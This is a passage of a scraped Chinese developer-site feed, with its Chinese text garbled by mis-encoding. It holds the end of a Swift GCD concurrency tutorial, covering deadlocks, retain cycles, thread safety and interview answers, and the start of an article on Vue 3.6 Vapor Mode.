            lock.lock()
            results.append(contentsOf: processed)
            lock.unlock()
            
            group.leave()
        }
    }
    
    group.notify(queue: .main) {
        completion(results)
    }
}
</code></pre>
<h4 data-id="heading-104">åœºæ™¯3ï¼šç½‘ç»œè¯·æ±‚ç®¡ç†</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">class</span> <span class="hljs-title class_">APIManager</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> semaphore <span class="hljs-operator">=</span> <span class="hljs-type">DispatchSemaphore</span>(value: <span class="hljs-number">3</span>)  <span class="hljs-comment">// æœ€å¤š3ä¸ªå¹¶å‘</span>
    
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">request</span>(<span class="hljs-params">url</span>: <span class="hljs-type">String</span>, <span class="hljs-params">completion</span>: <span class="hljs-keyword">@escaping</span> (<span class="hljs-type">Data</span>?) -&gt; <span class="hljs-type">Void</span>) {
        <span class="hljs-type">DispatchQueue</span>.global().async {
            <span class="hljs-keyword">self</span>.semaphore.wait()
            
            <span class="hljs-type">URLSession</span>.shared.dataTask(with: <span class="hljs-type">URL</span>(string: url)<span class="hljs-operator">!</span>) { data, <span class="hljs-keyword">_</span>, <span class="hljs-keyword">_</span> <span class="hljs-keyword">in</span>
                completion(data)
                <span class="hljs-keyword">self</span>.semaphore.signal()
            }.resume()
        }
    }
}
</code></pre>
<hr/>
<h3 data-id="heading-105">ä¸ƒã€å¸¸è§é—®é¢˜å’Œé™·é˜±</h3>
<h4 data-id="heading-106">é—®é¢˜1ï¼šæ­»é”</h4>
<h5 data-id="heading-107">ä¸»é˜Ÿåˆ—åŒæ­¥è°ƒç”¨</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// âŒ æ­»é”</span>
<span class="hljs-type">DispatchQueue</span>.main.sync {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"è¿™è¡Œä»£ç æ°¸è¿œä¸ä¼šæ‰§è¡Œ"</span>)
}
</code></pre>
<h5 data-id="heading-108">ä¸²è¡Œé˜Ÿåˆ—åµŒå¥—åŒæ­¥è°ƒç”¨</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// âŒ æ­»é”</span>
<span class="hljs-keyword">let</span> serialQueue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>(label: <span class="hljs-string">"serial"</span>)
serialQueue.sync {
    serialQueue.sync {
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"è¿™è¡Œä»£ç æ°¸è¿œä¸ä¼šæ‰§è¡Œ"</span>)
    }
}
</code></pre>
<h5 data-id="heading-109">è§£å†³æ–¹æ¡ˆ</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// âœ… ä½¿ç”¨ async</span>
<span class="hljs-type">DispatchQueue</span>.main.async {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"è¿™è¡Œä»£ç ä¼šæ‰§è¡Œ"</span>)
}

<span class="hljs-comment">// âœ… ä½¿ç”¨ä¸åŒçš„é˜Ÿåˆ—</span>
<span class="hljs-keyword">let</span> serialQueue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>(label: <span class="hljs-string">"serial"</span>)
serialQueue.async {
    <span class="hljs-type">DispatchQueue</span>.main.sync {
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"è¿™è¡Œä»£ç ä¼šæ‰§è¡Œ"</span>)
    }
}
</code></pre>
<hr/>
<h4 data-id="heading-110">é—®é¢˜2ï¼šå¾ªç¯å¼•ç”¨</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// âŒ å¾ªç¯å¼•ç”¨</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ViewController</span>: <span class="hljs-title class_">UIViewController</span> {
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">loadData</span>() {
        <span class="hljs-type">DispatchQueue</span>.global().async {
            <span class="hljs-keyword">self</span>.processData()  <span class="hljs-comment">// æ•è·äº† self</span>
        }
    }
}

<span class="hljs-comment">// âœ… ä½¿ç”¨ weak self</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ViewController</span>: <span class="hljs-title class_">UIViewController</span> {
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">loadData</span>() {
        <span class="hljs-type">DispatchQueue</span>.global().async { [<span class="hljs-keyword">weak</span> <span class="hljs-keyword">self</span>] <span class="hljs-keyword">in</span>
            <span class="hljs-keyword">self</span><span class="hljs-operator">?</span>.processData()
        }
    }
}
</code></pre>
<hr/>
<h4 data-id="heading-111">é—®é¢˜3ï¼šçº¿ç¨‹å®‰å…¨</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// âŒ çº¿ç¨‹ä¸å®‰å…¨</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> {
    <span class="hljs-keyword">var</span> count <span class="hljs-operator">=</span> <span class="hljs-number">0</span>
    
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">increment</span>() {
        count <span class="hljs-operator">+=</span> <span class="hljs-number">1</span>  <span class="hljs-comment">// å¤šçº¿ç¨‹è®¿é—®å¯èƒ½å‡ºé”™</span>
    }
}

<span class="hljs-comment">// âœ… ä½¿ç”¨ä¸²è¡Œé˜Ÿåˆ—ä¿æŠ¤</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> queue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>(label: <span class="hljs-string">"counter"</span>)
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> _count <span class="hljs-operator">=</span> <span class="hljs-number">0</span>
    
    <span class="hljs-keyword">var</span> count: <span class="hljs-type">Int</span> {
        <span class="hljs-keyword">return</span> queue.sync { _count }
    }
    
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">increment</span>() {
        queue.async {
            <span class="hljs-keyword">self</span>._count <span class="hljs-operator">+=</span> <span class="hljs-number">1</span>
        }
    }
}
</code></pre>
<hr/>
<h3 data-id="heading-112">å…«ã€æ€§èƒ½ä¼˜åŒ–å»ºè®®</h3>
<h4 data-id="heading-113">1. åˆç†é€‰æ‹©é˜Ÿåˆ—ç±»å‹</h4>
<ul>
<li><strong>ä¸²è¡Œé˜Ÿåˆ—</strong>ï¼šéœ€è¦é¡ºåºæ‰§è¡Œã€çº¿ç¨‹å®‰å…¨</li>
<li><strong>å¹¶è¡Œé˜Ÿåˆ—</strong>ï¼šç‹¬ç«‹ä»»åŠ¡ã€æ€§èƒ½ä¼˜åŒ–</li>
</ul>
<h4 data-id="heading-114">2. æ§åˆ¶å¹¶å‘æ•°é‡</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// ä½¿ç”¨ä¿¡å·é‡æ§åˆ¶å¹¶å‘æ•°</span>
<span class="hljs-keyword">let</span> semaphore <span class="hljs-operator">=</span> <span class="hljs-type">DispatchSemaphore</span>(value: <span class="hljs-number">5</span>)
</code></pre>
<h4 data-id="heading-115">3. é¿å…è¿‡åº¦ä½¿ç”¨ sync</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// âŒ è¿‡åº¦ä½¿ç”¨ sync ä¼šé˜»å¡çº¿ç¨‹</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">1</span><span class="hljs-operator">...</span><span class="hljs-number">100</span> {
    queue.sync {
        process(i)
    }
}

<span class="hljs-comment">// âœ… ä½¿ç”¨ async æé«˜æ€§èƒ½</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">1</span><span class="hljs-operator">...</span><span class="hljs-number">100</span> {
    queue.async {
        process(i)
    }
}
</code></pre>
<h4 data-id="heading-116">4. ä½¿ç”¨åˆé€‚çš„ QoS</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// æ ¹æ®ä»»åŠ¡é‡è¦æ€§è®¾ç½®ä¼˜å…ˆçº§</span>
<span class="hljs-type">DispatchQueue</span>.global(qos: .userInteractive).async {
    <span class="hljs-comment">// ç”¨æˆ·äº¤äº’ç›¸å…³</span>
}

<span class="hljs-type">DispatchQueue</span>.global(qos: .background).async {
    <span class="hljs-comment">// åå°ä»»åŠ¡</span>
}
</code></pre>
<hr/>
<h3 data-id="heading-117">ä¹ã€é¢è¯•å¸¸è§é—®é¢˜</h3>
<h4 data-id="heading-118">Q1: GCD å’Œ OperationQueue çš„åŒºåˆ«ï¼Ÿ</h4>
<p><strong>å›ç­”è¦ç‚¹ï¼š</strong></p>
<ul>
<li>GCD æ›´åº•å±‚ï¼ŒåŸºäº C è¯­è¨€ï¼Œæ€§èƒ½æ›´å¥½</li>
<li>OperationQueue åŸºäº GCDï¼Œæä¾›æ›´å¤šåŠŸèƒ½ï¼ˆä¾èµ–ã€å–æ¶ˆã€ä¼˜å…ˆçº§ï¼‰</li>
<li>GCD é€‚åˆç®€å•ä»»åŠ¡ï¼ŒOperationQueue é€‚åˆå¤æ‚ä»»åŠ¡ç®¡ç†</li>
</ul>
<h4 data-id="heading-119">Q2: å¦‚ä½•å®ç°çº¿ç¨‹å®‰å…¨ï¼Ÿ</h4>
<p><strong>å›ç­”è¦ç‚¹ï¼š</strong></p>
<ol>
<li>ä½¿ç”¨ä¸²è¡Œé˜Ÿåˆ—ä¿æŠ¤å…±äº«èµ„æº</li>
<li>ä½¿ç”¨é”æœºåˆ¶ï¼ˆNSLockã€NSRecursiveLockï¼‰</li>
<li>ä½¿ç”¨ <code>DispatchBarrier</code> å®ç°è¯»å†™é”</li>
<li>ä½¿ç”¨åŸå­æ“ä½œï¼ˆatomicï¼‰</li>
</ol>
<h4 data-id="heading-120">Q3: DispatchGroup å’Œ DispatchSemaphore çš„åŒºåˆ«ï¼Ÿ</h4>
<p><strong>å›ç­”è¦ç‚¹ï¼š</strong></p>
<ul>
<li>DispatchGroupï¼šç®¡ç†å¤šä¸ªä»»åŠ¡ï¼Œç­‰å¾…æ‰€æœ‰ä»»åŠ¡å®Œæˆ</li>
<li>DispatchSemaphoreï¼šæ§åˆ¶å¹¶å‘æ•°é‡ï¼Œé™åˆ¶åŒæ—¶æ‰§è¡Œçš„ä»»åŠ¡æ•°</li>
</ul>
<h4 data-id="heading-121">Q4: å¦‚ä½•é¿å…æ­»é”ï¼Ÿ</h4>
<p><strong>å›ç­”è¦ç‚¹ï¼š</strong></p>
<ol>
<li>é¿å…åœ¨ä¸»çº¿ç¨‹ä½¿ç”¨ <code>DispatchQueue.main.sync</code></li>
<li>é¿å…åœ¨ä¸²è¡Œé˜Ÿåˆ—ä¸­åµŒå¥—åŒæ­¥è°ƒç”¨</li>
<li>ä½¿ç”¨ <code>async</code> ä»£æ›¿ <code>sync</code></li>
<li>ä½¿ç”¨ä¸åŒçš„é˜Ÿåˆ—é¿å…å¾ªç¯ç­‰å¾…</li>
</ol>
<hr/>
<h3 data-id="heading-122">åã€æ€»ç»“</h3>
<h4 data-id="heading-123">GCD æ ¸å¿ƒè¦ç‚¹</h4>
<ol>
<li><strong>é˜Ÿåˆ—ç±»å‹</strong>ï¼šä¸²è¡Œé˜Ÿåˆ— vs å¹¶è¡Œé˜Ÿåˆ—</li>
<li><strong>æ‰§è¡Œæ–¹å¼</strong>ï¼šåŒæ­¥ï¼ˆsyncï¼‰vs å¼‚æ­¥ï¼ˆasyncï¼‰</li>
<li><strong>ç³»ç»Ÿé˜Ÿåˆ—</strong>ï¼šä¸»é˜Ÿåˆ—ï¼ˆmainï¼‰vs å…¨å±€é˜Ÿåˆ—ï¼ˆglobalï¼‰</li>
<li><strong>é«˜çº§ç‰¹æ€§</strong>ï¼šGroupã€Semaphoreã€Barrierã€Source</li>
</ol>
<h4 data-id="heading-124">æœ€ä½³å®è·µ</h4>
<ol>
<li>âœ… å¤§å¤šæ•°æƒ…å†µä½¿ç”¨ <code>async</code></li>
<li>âœ… UI æ›´æ–°å¿…é¡»åœ¨ä¸»é˜Ÿåˆ—</li>
<li>âœ… è€—æ—¶æ“ä½œæ”¾åœ¨åå°é˜Ÿåˆ—</li>
<li>âœ… ä½¿ç”¨ä¸²è¡Œé˜Ÿåˆ—ä¿æŠ¤å…±äº«èµ„æº</li>
<li>âœ… ä½¿ç”¨ä¿¡å·é‡æ§åˆ¶å¹¶å‘æ•°</li>
<li>âœ… æ³¨æ„å¾ªç¯å¼•ç”¨å’Œçº¿ç¨‹å®‰å…¨</li>
</ol>
<h4 data-id="heading-125">é¢è¯•å›ç­”æ¨¡æ¿</h4>
<p><strong>é—®é¢˜ï¼šä»‹ç»ä¸€ä¸‹ GCDï¼Ÿ</strong></p>
<blockquote>
<p>"GCD æ˜¯ Grand Central Dispatch çš„ç¼©å†™ï¼Œæ˜¯ iOS å¼€å‘ä¸­æœ€å¸¸ç”¨çš„å¤šçº¿ç¨‹æ–¹æ¡ˆã€‚</p>
<p><strong>æ ¸å¿ƒæ¦‚å¿µï¼š</strong></p>
<ul>
<li>é˜Ÿåˆ—åˆ†ä¸ºä¸²è¡Œé˜Ÿåˆ—å’Œå¹¶è¡Œé˜Ÿåˆ—</li>
<li>æ‰§è¡Œæ–¹å¼åˆ†ä¸ºåŒæ­¥å’Œå¼‚æ­¥</li>
<li>ä¸»é˜Ÿåˆ—ç”¨äº UI æ›´æ–°ï¼Œå…¨å±€é˜Ÿåˆ—ç”¨äºåå°ä»»åŠ¡</li>
</ul>
<p><strong>å¸¸ç”¨åŠŸèƒ½ï¼š</strong></p>
<ul>
<li><code>dispatch_async</code> å¼‚æ­¥æ‰§è¡Œä»»åŠ¡</li>
<li><code>DispatchGroup</code> ç®¡ç†å¤šä¸ªå¼‚æ­¥ä»»åŠ¡</li>
<li><code>DispatchSemaphore</code> æ§åˆ¶å¹¶å‘æ•°é‡</li>
<li><code>DispatchBarrier</code> å®ç°è¯»å†™é”</li>
<li><code>DispatchSource</code> ç›‘å¬ç³»ç»Ÿäº‹ä»¶</li>
</ul>
<p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong></p>
<ul>
<li>ä¸»é˜Ÿåˆ—åŒæ­¥è°ƒç”¨ä¼šæ­»é”</li>
<li>è€—æ—¶æ“ä½œæ”¾åœ¨åå°é˜Ÿåˆ—ï¼ŒUI æ›´æ–°å›åˆ°ä¸»é˜Ÿåˆ—</li>
<li>æ³¨æ„çº¿ç¨‹å®‰å…¨å’Œå†…å­˜ç®¡ç†ï¼ˆå¾ªç¯å¼•ç”¨ï¼‰</li>
</ul>
<p>æˆ‘åœ¨é¡¹ç›®ä¸­å¸¸ç”¨ GCD å¤„ç†ç½‘ç»œè¯·æ±‚ã€å›¾ç‰‡åŠ è½½ã€æ•°æ®å¤„ç†ç­‰å¼‚æ­¥ä»»åŠ¡ï¼Œç¡®ä¿ä¸»çº¿ç¨‹ä¸è¢«é˜»å¡ï¼Œä¿è¯ UI æµç•…æ€§ã€‚"</p>
</blockquote>
<hr/>
<p><em>æœ€åæ›´æ–°ï¼š2024</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue 3.6 é‡ç£…æ–°ç‰¹æ€§ï¼šVapor Mode æ·±åº¦è§£æ]]></title>    <link>https://juejin.cn/post/7595021656428724251</link>    <guid>https://juejin.cn/post/7595021656428724251</guid>    <pubDate>2026-01-14T14:32:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595021656428724251" data-draft-id="7595041883145388078" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" Vue 3.6 é‡ç£…æ–°ç‰¹æ€§ï¼šVapor Mode æ·±åº¦è§£æ"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2026-01-14T14:32:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¦‚æœä½ å¥½"/> <meta itemprop="url" content="https://juejin.cn/user/2272012281328215"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             Vue 3.6 é‡ç£…æ–°ç‰¹æ€§ï¼šVapor Mode æ·±åº¦è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2272012281328215/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¦‚æœä½ å¥½
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T14:32:57.000Z" title="Wed Jan 14 2026 14:32:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Vue 3.6 é‡ç£…æ–°ç‰¹æ€§ï¼šVapor Mode æ·±åº¦è§£æï¼Œè·³è¿‡è™šæ‹Ÿ DOM å®ç°æ€§èƒ½é£™å‡</h2>
<blockquote>
<p>ğŸ”¥  Vue 3.6 å¸¦æ¥çš„ Vapor Mode å ªç§°å‰ç«¯æ€§èƒ½ä¼˜åŒ–çš„</p>
</blockquote>
<p>Vue 3.6 å¼•å…¥çš„ <strong>Vapor Mode</strong>ï¼Œæ­£æ˜¯ä¸ºè§£å†³è¿™ä¸€ç—›ç‚¹è€Œç”Ÿã€‚å®ƒå½»åº•è·³è¿‡è™šæ‹Ÿ DOM ç¯èŠ‚ï¼Œé€šè¿‡ç¼–è¯‘æ—¶ä¼˜åŒ–ç›´æ¥ç”Ÿæˆé«˜æ•ˆçš„åŸç”Ÿ DOM æ“ä½œä»£ç ï¼Œåœ¨é™æ€å†…å®¹å±…å¤šçš„åœºæ™¯ä¸‹å®ç°äº†è´¨çš„æ€§èƒ½é£è·ƒã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä»åŸç†åˆ°å®æˆ˜ï¼Œä¸€æ­¥æ­¥åƒé€ Vapor Modeã€‚</p>
<h3 data-id="heading-1">ä¸€ã€ä¸ºä»€ä¹ˆéœ€è¦ Vapor Modeï¼Ÿä¼ ç»Ÿè™šæ‹Ÿ DOM çš„ç“¶é¢ˆ</h3>
<p>è¦ç†è§£ Vapor Mode çš„ä»·å€¼ï¼Œé¦–å…ˆè¦æ˜ç¡®ä¼ ç»Ÿè™šæ‹Ÿ DOM æ¨¡å¼çš„æ€§èƒ½å¼€é”€ç‚¹ã€‚æˆ‘ä»¬å…ˆå›é¡¾ä¸€ä¸‹ä¼ ç»Ÿ Vue ç»„ä»¶çš„æ¸²æŸ“æµç¨‹ï¼š</p>
<ol>
<li>
<p>ç»„ä»¶åˆå§‹åŒ–/æ›´æ–°æ—¶ï¼Œé€šè¿‡ <code>h</code> å‡½æ•°åˆ›å»ºè™šæ‹Ÿ DOM èŠ‚ç‚¹ï¼ˆVNodeï¼‰ï¼›</p>
</li>
<li>
<p>æ„å»ºå®Œæ•´çš„ VNode æ ‘ï¼Œç”¨äºæè¿°å½“å‰é¡µé¢çš„ DOM ç»“æ„ï¼›</p>
</li>
<li>
<p>æ›´æ–°é˜¶æ®µï¼Œé€šè¿‡ diff ç®—æ³•éå†æ–°æ—§ VNode æ ‘ï¼Œæ‰¾å‡ºå·®å¼‚èŠ‚ç‚¹ï¼›</p>
</li>
<li>
<p>å°†å·®å¼‚èŠ‚ç‚¹è½¬æ¢ä¸ºçœŸå® DOM æ“ä½œï¼Œå®Œæˆé¡µé¢æ›´æ–°ã€‚</p>
</li>
</ol>
<ul>
<li>
<p>VNode åˆ›å»ºå¼€é”€ï¼šæ¯æ¬¡æ¸²æŸ“éƒ½è¦åˆ›å»ºå¤§é‡ VNode å¯¹è±¡ï¼Œå ç”¨ CPU å’Œå†…å­˜ï¼›</p>
</li>
<li>
<p>diff ç®—æ³•å¼€é”€ï¼šå³ä½¿é¡µé¢æ— ä»»ä½•å˜åŒ–ï¼Œä¹Ÿå¯èƒ½è§¦å‘ä¸å¿…è¦çš„ diff å¯¹æ¯”ï¼›</p>
</li>
<li>
<p>ä¸­é—´å±‚è½¬æ¢å¼€é”€ï¼šVNode æœ€ç»ˆéœ€è¦æ˜ å°„ä¸ºçœŸå® DOM æ“ä½œï¼Œå¤šä¸€å±‚è½¬æ¢å°±å¤šä¸€å±‚æŸè€—ã€‚</p>
</li>
</ul>
<p>Vapor Mode æ­£æ˜¯é’ˆå¯¹è¿™äº›åœºæ™¯ï¼Œé€šè¿‡ã€Œç æ‰ä¸­é—´å±‚ã€çš„æ€è·¯ï¼Œå®ç°äº†æ€§èƒ½çš„æè‡´ä¼˜åŒ–ã€‚</p>
<h3 data-id="heading-2">äºŒã€Vapor Mode æ ¸å¿ƒåŸç†ï¼šè·³è¿‡è™šæ‹Ÿ DOMï¼Œç›´æ¥ç¼–è¯‘åŸç”Ÿ DOM æ“ä½œ</h3>
<h4 data-id="heading-3">1. æ ¸å¿ƒç†å¿µ</h4>
<p>Vapor Mode çš„æ ¸å¿ƒæ€æƒ³å¯ä»¥æ¦‚æ‹¬ä¸ºã€Œ<strong>ç¼–è¯‘æ—¶æœ€å¤§åŒ–ä¼˜åŒ–ï¼Œè¿è¡Œæ—¶æœ€å°åŒ–å¼€é”€</strong>ã€ï¼š</p>
<ul>
<li>
<p>è·³è¿‡è™šæ‹Ÿ DOMï¼šä¸å†ç”Ÿæˆ VNode æ ‘ï¼Œä¹Ÿä¸æ‰§è¡Œ diff ç®—æ³•ï¼›</p>
</li>
<li>
<p>ç¼–è¯‘æ—¶ç”ŸæˆåŸç”Ÿ DOM ä»£ç ï¼šå°†æ¨¡æ¿ç›´æ¥ç¼–è¯‘ä¸º <code>document.createElement</code>ã€<code>element.textContent</code>ã€<code>element.setAttribute</code> ç­‰åŸç”Ÿ DOM æ“ä½œï¼›</p>
</li>
<li>
<p>é™æ€å†…å®¹æè‡´ä¼˜åŒ–ï¼šå¯¹äºå®Œå…¨é™æ€çš„å†…å®¹ï¼Œç¼–è¯‘åç”Ÿæˆä¸€æ¬¡æ€§æ¸²æŸ“ä»£ç ï¼Œæ— ä»»ä½•è¿è¡Œæ—¶é¢å¤–å¼€é”€ã€‚</p>
</li>
</ul>
<h3 data-id="heading-4">ä¸‰ã€å®æˆ˜ç¤ºä¾‹ï¼šå¦‚ä½•å¼€å¯å¹¶ä½¿ç”¨ Vapor Mode</h3>
<p>Vapor Mode ä»…æ”¯æŒ Vue 3.6+ ç‰ˆæœ¬ï¼Œéœ€é€šè¿‡ç¼–è¯‘é€‰é¡¹å¼€å¯ã€‚ä¸‹é¢åˆ†åˆ«ç»™å‡º <strong>Vite</strong> å’Œ <strong>Vue CLI</strong> ä¸¤ä¸ªä¸»æµæ„å»ºå·¥å…·çš„å®Œæ•´ç¤ºä¾‹ï¼Œè¦†ç›–ã€Œé™æ€å®˜ç½‘é¡µé¢ã€å’Œã€Œç®€å•ä¿¡æ¯å±•ç¤ºç»„ä»¶ã€ä¸¤ä¸ªå…¸å‹åœºæ™¯ã€‚</p>
<h4 data-id="heading-5">å‰ç½®æ¡ä»¶ï¼šå‡çº§ Vue ç‰ˆæœ¬</h4>
<p>é¦–å…ˆç¡®ä¿é¡¹ç›® Vue ç‰ˆæœ¬å‡çº§è‡³ 3.6 åŠä»¥ä¸Šï¼š</p>
<pre><code class="hljs language-bash" lang="bash">
<span class="hljs-comment"># npm</span>
npm install vue@^3.6.0 --save

<span class="hljs-comment"># yarn</span>
yarn add vue@^3.6.0
</code></pre>
<h4 data-id="heading-6">ç¤ºä¾‹ 1ï¼šVite é¡¹ç›®å¼€å¯ Vapor Modeï¼ˆé™æ€å®˜ç½‘é¡µé¢ï¼‰</h4>
